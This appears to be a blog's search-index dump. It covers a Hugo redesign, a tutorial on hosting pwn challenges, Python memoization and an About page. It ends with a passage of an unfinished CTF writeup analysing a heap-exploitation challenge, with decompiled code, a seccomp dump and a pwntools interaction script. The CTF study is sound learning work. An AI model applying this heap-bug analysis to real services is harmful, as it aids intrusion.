[{"categories":["tech"],"content":"Under new management","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":" The site used to look like this. Ugly, right? To my grand audience of absolutely nobody, I present: this blog, but better! I‚Äôve been putting this off for a while. I don‚Äôt like to think of myself as a web designer, and I didn‚Äôt have compelling reasons to work on setting up anything more complex than the default recommended Jekyll+Pages setup. This changes today. I‚Äôll be out of the military soon, and that means I need a üåü stunning üåü website for employers to see. Plus, I‚Äôve gotten the writer‚Äôs bug as of recent, and I want a place to throw my words on that doesn‚Äôt look as bad as v1 of this site. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:0:0","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Finding Hugo Like many other Rust developers, I read Faster Than Lime. Their blog looks really nice, and I wanted to copy it, so I looked for their blog post on how they developed their site. Answer: really complex stuff! But then I read this part: I definitely remember using nanoc (Ruby), and switching to jekyll (Ruby) at some point. When I launched the Patreon integration, I was using hugo. Now, I really don‚Äôt want to be spending any time saying negative things about projects in this post - not when there‚Äôs so much cool stuff to show off! So all I‚Äôll say is this: hugo was easy to get started with, and it stayed relatively out of my way. I forked one of the more minimal themes, and added the pieces I wanted: cool bear‚Äôs hot tip, some navigation, etc. Well, that‚Äôs not exactly an endorsement, but I‚Äôll take it over the less trodden path. Let‚Äôs google, ‚ÄúHugo themes‚Äù: Cropped for brevity; there are hundreds of these themes on the page. That one on the right looks pretty good! Let‚Äôs try it. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:1:0","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Papermod Fast and pretty good! Setup worked entirely as expected, except‚Ä¶ I wanted to mix the centered ‚Äúprofile mode‚Äù (pictured above) with a post list, but that wasn‚Äôt a default option Their TOCs uses the default Hugo style. It doesn‚Äôt look pretty enough: Syntax highlighting was somewhat wrong. See the unhighlighted second Ls here: So I decided to look for another theme. I eventually settled with LoveIt. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:1:1","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Installing LoveIt I faced many, many technical problems trying to get this theme to run. In order: After installing the theme as a submodule, I got an error running hugo server -D: Module \"LoveIt\" is not compatible with this Hugo version; This was confusing because I had the latest Hugo version (v0.101), and the stated required version for the LoveIt theme was v0.64 A round of googling later, and I figure out the error message actually happens because my hugo installation wasn‚Äôt compiled with the SCSS extension. I try to download an -extended release, but I find out that the hugo main repository does not publish -extended releases for arm64 CPUs, which I need because I‚Äôm using a Raspberry Pi for this. I attempt to compile the extended version of hugo directly on my RPi. This fails, because go install requires more than 0.5 GB of memory, which my little tiny machine cannot offer. I attempt to cross-compile Hugo from a better machine. This fails with an abstruse error message. I eventually figure out that it failed because compilation requires go\u003e=1.18. After updating, the cross-compilation fails again, because Hugo depends on a C/C++ library that is more difficult to cross compile (this is the same reason that the main repository does not give -extended releases) I luckily find a repository (https://github.com/hugoguru/dist-hugo/releases) that has compiled -extended versions of Hugo for ARM. This ends the torment, mostly. After that mess, it runs: Hurray. Let‚Äôs move on. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:1:2","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Changes So, what‚Äôs new about the site? Is it just a CSS refresh? Not exactly. Although I was mostly motivated by the idea of getting the site to look ‚ú® prettier ‚ú®, the new framework comes with several added features: Searching. The screenshot above shows this. Emojis, like the ones above. Post reactions! With the power of giscus: Shortcode. I make good use of them in my about page. Better development experience. You won‚Äôt see this on the site, but the file/post structure for Hugo is much more pleasant than Jekyll was. I also made a few small changes to the LoveIt theme for this site, mostly to embed images more easily. See here ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:1:3","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Moving forward I didn‚Äôt do all of this designer work just to let it rot like the last one. Moving forward, I‚Äôll be pushing posts to this site weekly, whether anyone reads them or not. It‚Äôll be somewhat like Matt Rickard‚Äôs blog: a regular stream of short posts on tech things. I have enough of a backlog to keep this up for several months, and I plan on going on ad infinitum. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:2:0","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["Tech"],"content":"It's really not hard.","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"In light of recent events, I‚Äôve been convinced to share a basic tutorial on how You ‚Äî the ordinary programmer with minimal Linux/Docker/Networking experience ‚Äî can host binary exploitation challenges with minimal hassle and reasonable security. ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:0:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Requirements A stable linux server with the packages docker-ce and git installed. One (or more) pwn challenge(s) you intend to host Basic linux experience That‚Äôs it. ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:1:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Setting up a challenge folder Let‚Äôs say you have a binary named chal, as well as a flag. We‚Äôll start by git cloning a template folder: git clone https://github.com/152334H/ctf_xinetd Move the challenge binary \u0026 flag into ctf_xinetd/bin: mv chal flag ctf_xinetd/bin If you plan on hosting multiple pwn challenges, you might want to rename the cloned folder: mv ctf_xinetd my_uniq_chal_name The final result should look something like this: /path/to/my_uniq_chal_name$ tree . ‚îú bin ‚îÇ ‚îú chal ‚îÇ ‚îî flag ‚îú ctf.xinetd ‚îú Dockerfile ‚îú README.md ‚îú setup.sh ‚îî start.sh ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:2:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Putting the challenge online Spend a few minutes to come up with a snazzy port number ($PORT) for your challenge. To get your challenge running, execute /path/to/my_uniq_chal_name$ ./setup.sh $PORT chal my_uniq_chal_name After that, you‚Äôre done! Using the example challenge linked: $ nc localhost $PORT Type something with 7fdde7ac8e10: hi You put: hi If you ever need to change the challenge file, you can update the running service by running ./rebuild.sh. ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:3:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Benefits of using this it‚Äôs really simple and you can‚Äôt mess it up (fingers crossed) shell permissions are limited and you won‚Äôt have players messing with the shell or erasing flags halfway through a CTF you run an .sh file controlled by me without ever reading its contents ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:4:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["Tech"],"content":"Downsides of using this might not scale very well hard to justify getting paid by the hour for something this simple some people just don‚Äôt like docker Sieberrsec has been, and will be using this setup for Sieberrsec CTF events, so if you find any vulnerabilities in my fork of ctf_xinetd, be sure to save them until the next CTF dutifully inform us if you find anything of note. ","date":"June 26, 2021","objectID":"/blog/hosting-pwn-challenges/:5:0","tags":["pwn","docker","my setups"],"title":"Hosting pwn challenges: a simple tutorial","uri":"/blog/hosting-pwn-challenges/"},{"categories":["tech"],"content":"The default shell prompt (for Ubuntu 20) looks like this: username@hostname:/path/to/cwd$ ‚ñà The format of the prompt is defined in .bashrc, as the PS1 variable: If you add a newline around the end of the PS1 defintion, your shell will start looking like this (after re-running bash): username@hostname:/path/to/cwd $ ‚ñà Why do this? More screen width for a one-liner. You can write longer commands before you get disrupted by line-wrapping. Especially useful if you‚Äôre using Termux. Easier to read the prompt. Your eyes naturally capture text above\u0026below the line you‚Äôre working on, so you get to see more without shifting attention. It‚Äôs an extremely simple thing to do. It‚Äôs cumbersome and potentially disruptive to install $your_favourite_shell_theme every time you touch a remote machine, whereas adding \\n to .bashrc takes about ten seconds in a text editor. ","date":"September 4, 2022","objectID":"/blog/append-a-newline/:0:0","tags":["my setups"],"title":"Append a newline to your shell prompt","uri":"/blog/append-a-newline/"},{"categories":["tech"],"content":"Memoization is a part of the standard toolkit for, ‚Äúthings I can use to solve the algorithm question in my next job interview‚Äù. Most of the time, I like to use functools.cache for this: From @gf_256 Using the fibonacci function as an example, a simple Python implementation might look like this: # With @cache from functools import cache # python3.9 @cache def fib(n: int) -\u003e int: return n if n \u003c 2 else fib(n-1) + fib(n-2) # Assume that `fib(n)` only receives non-negative integers. However, some interviewers might reject that One Weird Trick, given that the point of most coding interviews is to check for one‚Äôs understanding of the algorithm, rather than its existence. So, instead of importing a solution, you‚Äôd manually create/check a hashtable, typically named dp[]: # Without @cache dp = {0:0, 1:1} # base cases def fib(n: int) -\u003e int: res = dp.get(n,None) # avoid using `n in dp` to if res is None: # minimise calls to dp.__getitem__ dp[n] = res = fib(n-1) + fib(n-2) return res And this works just as well as the @cache solution: \u003e\u003e\u003e [fib(i) for i in range(10)] [0, 1, 1, 2, 3, 5, 8, 13, 21, 34] Job well done? Probably. But personally, don‚Äôt like it. The @cached solution is simple, readable, and intuitive. It‚Äôs practically identical to how you‚Äôd write it mathematically: $$ \\forall\\ n \u003e 1, F_n = F_{n-1} + F_{n-2}$$ The manual dp[] solution is not as nice. The base cases are a bit more obvious, but the meat of the function is a lot more different. Plus, the dp[] variable gets leaked to the global namespace, when it should really only be accessible to the fib() function itself. Can we do better? ","date":"August 28, 2022","objectID":"/blog/encapsulating-dp/:0:0","tags":["code","python"],"title":"@cache without @cache","uri":"/blog/encapsulating-dp/"},{"categories":["tech"],"content":"Alternatives I want to bind a stateful variable (dp[]) to a function. The natural tool for that in python is an object, so let‚Äôs do that: # Without @cache, using a class class Fib: dp = {0:0, 1:1} def fib(n: int) -\u003e int: res = Fib.dp.get(n,None) if res is None: Fib.dp[n] = res = Fib.fib(n-1) + Fib.fib(n-2) return res fib = Fib.fib This works (as in, dp{} is no longer a global variable), but it‚Äôs much uglier. Can we do better? Did you know that in Python, functions are objects too? # Without @cache, using the function itself as a class def fib(n: int) -\u003e int: res = fib.dp.get(n,None) if res is None: fib.dp[n] = res = fib(n-1) + fib(n-2) return res fib.dp = {0:0, 1:1} You can assign any attribute to a function, and it‚Äôll just work. Albeit with potential performance issues. Still, both of these options leaves .dp available to the public namespace. Can we hide it entirely? In theory, this is what you‚Äôd use a closure for: # Without @cache, using a closure def _make_fib(): dp = {0:0, 1:1} def fib(n: int) -\u003e int: res = dp.get(n,None) if res is None: dp[n] = res = fib(n-1) + fib(n-2) return res return fib fib = _make_fib() But this is really long and ugly. We can separate the business logic with the decorator pattern: # Without @cache, using a decorator def dpcache(f): dp = {} def inner(n): res = dp.get(n,None) if res is None: dp[n] = res = f(n) return res return inner @dpcache def fib(n: int) -\u003e int: return n if n \u003c 2 else fib(n-1) + fib(n-2) And, in doing so, return to the original @cache design for the fib() function. This is even somewhat similar to what @cache itself does, the Least Recently Used part aside. The bootleg @dpcache solution might be the cleanest, but it also has the largest number of lines of all the solutions suggested. If we‚Äôre comfortable with making our code look ugly, we can use a hack with default variables instead: # Without @cache, using a default variable def fib(n: int, *, dp={0:0,1:1}) -\u003e int: res = dp.get(n,None) if res is None: dp[n] = res = fib(n-1) + fib(n-2) return res This is very close to the essence of our initial design for manual memoization, while also keeping the dp[] dictionary encapsulated. The positional glob (*) limits the potential for an accidental fib(n, ?) call, but it‚Äôs possible someone else might unwittingly add the dp= argument after reading fib()‚Äôs type signature. The use of default arguments in a singleton fashion this way is also, practically speaking, too smart for its own good ‚Äì it‚Äôs a Code Smell, albeit in a different manner than having global variables. ","date":"August 28, 2022","objectID":"/blog/encapsulating-dp/:1:0","tags":["code","python"],"title":"@cache without @cache","uri":"/blog/encapsulating-dp/"},{"categories":["not a post"],"content":"Otherwise known as the more verbose 404","date":"August 26, 2022","objectID":"/todo/","tags":[],"title":"TODO","uri":"/todo/"},{"categories":["not a post"],"content":"If you‚Äôre reading this page, it means one of two things: You intentionally saw the page titled, ‚ÄúTODO‚Äù, and decided to check it out. Here it is. You were on one of the normal pages of this site, clicked a hyperlink, and found yourself here inexplicably. The rest of this page is dedicated to (2). Welcome to the null pointer This is the null pointer node. It‚Äôs the page that says, ‚ÄúThat blog post you were looking for doesn‚Äôt exist yet.‚Äù My blog notes form a vague, gestational web of thinking. Although some of my blogposts are isolated nodes, more often I have posts referencing posts referencing posts referencing‚Ä¶ a dense graph with connections all over the place. Filling out the full details of the whole graph is difficult ‚Äì I‚Äôm a slow writer ‚Äì so I often make posts that reference incomplete, unpublished ideas. The link that you clicked to get here will be real page, someday. Just not yet. ","date":"August 26, 2022","objectID":"/todo/:0:0","tags":[],"title":"TODO","uri":"/todo/"},{"categories":["not a post"],"content":" Welcome This is the personal site of Sherman Chann (aka 152334H) ","date":"August 12, 2022","objectID":"/about/:0:0","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Stuff I‚Äôve done Weakly sorted by chronology Psst... Each section starts with a few logos like these: They indicate, roughly speaking, what technologies I used for a specific project. If you‚Äôre confused about their relevance, try hovering over them (or long press on mobile): some of these icons have titles explaining what they‚Äôre used for: ","date":"August 12, 2022","objectID":"/about/:1:0","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"This blog You‚Äôre looking at it! This blog is hosted by Github Pages. I upload the source files for this blog (developed in Hugo) to a repository, triggering a Github Action that compiles everything into a bundle minified HTML/CSS/JS. This produces the static page you‚Äôre reading right now. Previously, I used Jekyll (instead of Hugo), but there were many unfortunate problems with that setup. More on that here. I use Obsidian to draft out posts, before settling the post metadata \u0026\u0026 final checks in neovim while running hugo server -D. This isn‚Äôt the greatest workflow, and I‚Äôm working on a file sync system to smoothen the process. ","date":"August 12, 2022","objectID":"/about/:1:1","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"react-viewer-viewer A small React.js Tauri App (full demo here, if the one below doesn‚Äôt work) I developed to learn the basics of modern Full Stack development. Keywords: typescript, material-ui, create-react-app. Your browser does not support iframes. Some screenshots: Not very complex Matryoshka screenshot I started the project while I was midway through the Full Stack Open course online, so some of the design decisions in the app are regrettable. I‚Äôve also developed a small backend API for the app (keywords: NodeJS, Express, MongoDB, docker-compose), but I‚Äôve yet to publish its source. ","date":"August 12, 2022","objectID":"/about/:1:2","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Sieberrsec CTF 3.0 (2021) Together with my friends at IRS Cybersec, we hosted Sieberrsec CTF 3.01, an online competition with \u003e200 players, targeting Singaporeans in Secondary/Pre-Teritary Education. Promotional image from 2021. The link works as of 08/2022, but won‚Äôt stay up forever. I was personally responsible for: Challenge development: I made the most number of challenges, tested even more of them, and did my best to simplify/balance them in favour of the participants. I also handled the hosting/testing for most remote challenge microservices. QA/Admin details: CTF Platform testing, Discord announcements/organisation, post-event cleanup \u0026\u0026 writeup collection. It takes a lot more than that to run a CTF, but I‚Äôll leave that information to a future post. 1 - 1.0 was a school event, 2.0 was nominally public but primarily catered to a few schools. ","date":"August 12, 2022","objectID":"/about/:1:3","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"CVEs (at Star Labs) CVE-2021-34978 CVE-2021-34979 ","date":"August 12, 2022","objectID":"/about/:1:4","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"pwnscripts (2020-2021) pwnscripts is a deprecated Python package I developed as a personal extension of pwntools. This was the first serious project I created. It‚Äôs not big ‚Äì a few thousand Lines of Code in total ‚Äì but it got me working with technologies that I had felt were for Real‚Ñ¢ Developers Only. To summarise: I experienced the process of creating, developing, and publishing Python libraries to PyPi I went through Test Driven Development with the pytest framework. I made use of Github Actions to do the two things above automatically after pushing commits. I tried switching to vscode because I realised plain old vim wasn‚Äôt enough for modern development (although later I switched back to neovim after understanding its plugin ecosystem better). I got to understand first-hand why people don‚Äôt recommend using Python for large projects (spoiler: __magic_methods__ are exceedingly bad for code readability!) And I learned a lot about programming in general, along the way. But I‚Äôm not working on this project anymore, because‚Ä¶ ","date":"August 12, 2022","objectID":"/about/:1:5","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"CTF player (2019-2021) I used to be very active in the CTF scene. My old CTFTime profile and my team‚Äôs writeup repository is full of hundreds of challenges I‚Äôve covered over the years. I won prizes for several local competitions in that time period, including: 1st in CDDC 2020 (Junior Category) 1st in Cyberthon 2020 2nd in Whitehacks 2020 1st in STACK The Flags 2020 (Junior Category) 1st in Whitehacks 2021 3rd in DSO-NUS CTF 2021 1st in CTF.SG CTF 2021 I am no longer a CTF player. I‚Äôm happy to assist juniors/newcomers in learning the fundamentals, but I‚Äôm effectively retired from the local cadre of CTF professionals. ","date":"August 12, 2022","objectID":"/about/:1:6","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Advent of Code Advent of Code was my introduction to the world of programming puzzles. My secondary school didn‚Äôt offer much in the way of programming (beyond the regrettable Hello World tutorials), and I might not have become the programmer I am today without Eric Wastl‚Äôs work. Year Points (global) Languages 2018 0 :( Python, C 2019 37 Python, JS, C 2020 28 Python 2021 372 Python Although I started playing Advent of Code to learn programming, I mostly do it for the fun of it, nowadays. ","date":"August 12, 2022","objectID":"/about/:1:7","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Other programming problems Kattis While I‚Äôm not a Real‚Ñ¢ Competitive Programmer, I play contests every now and then for fun, as well as to keep myself qualified for basic coding interviews. ","date":"August 12, 2022","objectID":"/about/:1:8","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Open source contributions I‚Äôve made minor contributions to other people‚Äôs repositories. See my GitHub profile for more info. ","date":"August 12, 2022","objectID":"/about/:1:9","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"Academics I‚Äôm an alumnus of Hwa Chong Institution (College), and spent most of my free time there helping out the Cybersecurity Section of the Infocomm and Robotics Society (IRS). Some info that will only make sense to Singaporean eggheads: PCMH+H3 Chem, AAAA/AD+Dist, SSEF, SChO. I include this for completion‚Äôs sake; most readers probably don‚Äôt care about this. ","date":"August 12, 2022","objectID":"/about/:2:0","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["not a post"],"content":"My religious beliefs Ubuntu, neovim, tabs \u003e splits, tmux, docker, python3 (4 spaces per indent), Rust \u003e C*, typescript, printf-debugging, Casing_doesNotMatter, iterators \u003e indexing, Copilot, industry collapse by 2030. ","date":"August 12, 2022","objectID":"/about/:3:0","tags":["personal"],"title":"About","uri":"/about/"},{"categories":["CTF"],"content":"An unfinished pwn writeup, wrapped with the airs of regret.","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"If you‚Äôre only interested in the technical details for The Mound, I have a minified version of this post on ctfdump. Back in May, I started work on the outlines of a special blogpost. It‚Äôs working title was Doing pwn fast: a personal strategy for speedpwning in CTFs, and I scrapped it when I realised how luridly inefficient I can be in the process of pwning. The inefficiency ‚Äì as revolting as it was ‚Äì wasn‚Äôt an immediate concern, and I moved on. Fast forward to now. In the leadup to the 9th of August, I spent my weekend huddled in my house, itching away at RaRCTF‚Äôs toughest pwnable: an introductory heap CLI that certain professionals finished within hours: I wasn‚Äôt one of those professionals. Have a look at the scoreboard graph for the group of experts I happened to tag along with: Read the graph: Aug 8, 1PM minus Aug 7, 1AM. Accounting for sleep, I spent about a full day on a regular glibc pwn challenge. In the spirit of the Sunk Cost Fallacy, I figured I‚Äôd invest even more of my time into picking apart the challenge through this over-elaborate writeup. Crazy, right? There‚Äôs something cathartic, in writing all of this. A eulogy of sorts to the abandoned introspection I attempted in May. Could I have done this challenge faster, if I‚Äôd went about things differently? Maybe, but that‚Äôs not the question I‚Äôll be answering in this writeup. I made a number of mistakes in my approach to this challenge, mistakes that I‚Äôll be covering in detail here. In the future, I might try to generalise the problems I‚Äôve identified here for a better rendition of Doing pwn fast, but for now: The Mound [800] The glibc heap is too insecure. I took matters into my own hands and swapped efficiency for security. Files: mound.zip Archive: mound.zip Length Date Time Name --------- ---------- ----- ---- 18160 2021-08-06 09:14 mound/mound 451 2021-08-06 04:38 ctf.xinetd 566 2021-08-06 17:08 Dockerfile 100 2021-08-06 16:43 setup.sh 25 2021-08-06 04:39 start.sh 22 2021-08-06 17:30 flag.txt 2029224 2021-08-06 17:13 libc.so.6 Relevant details: $ checksec mound/mound [*] '/mound' Arch: amd64-64-little RELRO: Partial RELRO # ! Stack: No canary found # ! NX: NX enabled PIE: No PIE (0x400000) # ! $ seccomp-tools dump mound/mound line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0c 0xc000003e if (A != ARCH_X86_64) goto 0014 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0a 0x00 0x40000000 if (A \u003e= 0x40000000) goto 0014 0004: 0x15 0x09 0x00 0x0000003b if (A == execve) goto 0014 0005: 0x15 0x08 0x00 0x00000142 if (A == execveat) goto 0014 0006: 0x15 0x07 0x00 0x00000002 if (A == open) goto 0014 0007: 0x15 0x06 0x00 0x00000003 if (A == close) goto 0014 0008: 0x15 0x05 0x00 0x00000055 if (A == creat) goto 0014 0009: 0x15 0x04 0x00 0x00000086 if (A == uselib) goto 0014 0010: 0x15 0x03 0x00 0x00000039 if (A == fork) goto 0014 0011: 0x15 0x02 0x00 0x0000003a if (A == vfork) goto 0014 0012: 0x15 0x01 0x00 0x00000038 if (A == clone) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL $ ./libc-database/identify libc.so.6 libc6_2.31-0ubuntu9.1_amd64 The seccomp filter is a little bit interesting, but I‚Äôll cover it later on. It‚Äôs also worth noting that setup.sh contains this line: $ cat setup.sh #!/bin/sh mv /pwn/flag.txt /pwn/$(xxd -l 16 -p /dev/urandom).txt ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:0:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Working backwards mount has a good number of functions: There‚Äôs a function named win; that seems rather important. ssize_t win() { char buf[64]; // [rsp+0h] [rbp-40h] BYREF puts(\"Exploiting BOF is simple right? ;)\"); return read(0, buf, 0x1000uLL); } The binary doesn‚Äôt have PIE or stack canaries or RELRO enabled, so the bulk of this challenge must be in gaining RIP control via a GOT overwrite. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:1:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Program outline This is main() (partially prettified): void *arr[16]; // .bss:0x404180 size_t sizes[16]; // .bss:0x404200 int main() { unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); install_seccomp(); puts(\"I am the witch mmalloc\"); puts(\"Force, Prime, Mind, Lore, Chaos, Orange, Einharjar, Poortho, Spirit, Red, Roman, Corrosion, Crust, Rust, all is known to me.\"); puts(\"It is, from all of my training, that I have seen the flaws in glibc heap.\"); puts(\"Welcome, fellow pwner, to The Mound\"); moundsetup(); memset(s, 0, 0x100uLL); while ( 1 ) { #define REJECT {puts(\"No.\"); break;} switch ( int opt = menu() ) { case 4: // free printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; case 3: // edit printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; case 2: // add printf(\"Size of pile: \"); __isoc99_scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; default: puts(\"Cya later :p\"); exit(0); } } } That‚Äôs pretty long. Let‚Äôs break it up into two segments: the preamble, and the while(1) loop. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:2:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Preamble main() doesn‚Äôt have a lot of variables. unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF The 3 variables here are user-editable, and we‚Äôll talk about them later. Just keep in mind that user_sz and idx are unsigned integers written to with scanf(\"%d\") calls later on, and s[] is written to with a non-overflowing, non-zero-terminating1 read() call. After this, main() runs a bunch of initialisers: setvbuf(...); // all 3 i/o streams are unbuffered install_seccomp(); // start seccomp filter as shown at the start of this writeup puts(...); // intro message moundsetup(); // setup the \"mound\"; this challenge's heap implementation memset(s, 0, 0x100uLL); // don't think too much about this; s[] can still be used for a leak if you try hard enough The only complicated function here is moundsetup(); skip ahead to this part of the writeup if you want to understand it. If not: ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:2:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"main()‚Äôs loop The CLI gives five options: 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home Here‚Äôs a skeleton script to deal with the options: from pwnscripts import * context.binary = 'mound' context.libc = 'libc.so.6' r = context.binary.process() def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(sz: int, idx: int, s: bytes): choose(2) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) (5) just calls exit(0), but the rest are more complex. Add sand case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; This option is really weird. A user-inputted stream of bytes ‚Äì not necessarily nul-terminated ‚Äì are sent to strdup, and the resultant glibc malloc‚Äôd string is stored at arr[idx]. This means that some of arr[]‚Äôs elements can be a mixture of mound pointers, and actual glibc heap pointers. It‚Äôs also worth noting that the str* functions here can overflow, depending on whether the stack has extra nul-bytes or not. Add dirt case 2: // add printf(\"Size of pile: \"); scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; So this is a little bit interesting. The maximum allocation size is 0xfff; user_sz is an unsigned so the single-bounded comparison works out. For some reason, sizes[idx] is set to 0 instead of user_sz. This is a little bit weird because of case 3: Replace dirt case 3: // edit printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; sizes[idx] has to be non-zero for the edit to pass. Since Option 2 sets sizes[idx] to 0, arr[idx] can only be edited if it‚Äôs a pointer from the glibc heap in case 1, or if sizes[idx] can be modified somewhere else. Remove dirt case 4: // free printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); // remember that `idx` itself is typed as unsigned. if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; This option calls mfree() on arr[idx]. There‚Äôs only one bug here, and it‚Äôs that arr[idx] is not zeroed. So, this is a little bit odd. There are obvious Bad Things going on in these options, but the exploit required isn‚Äôt immediately obvious here. 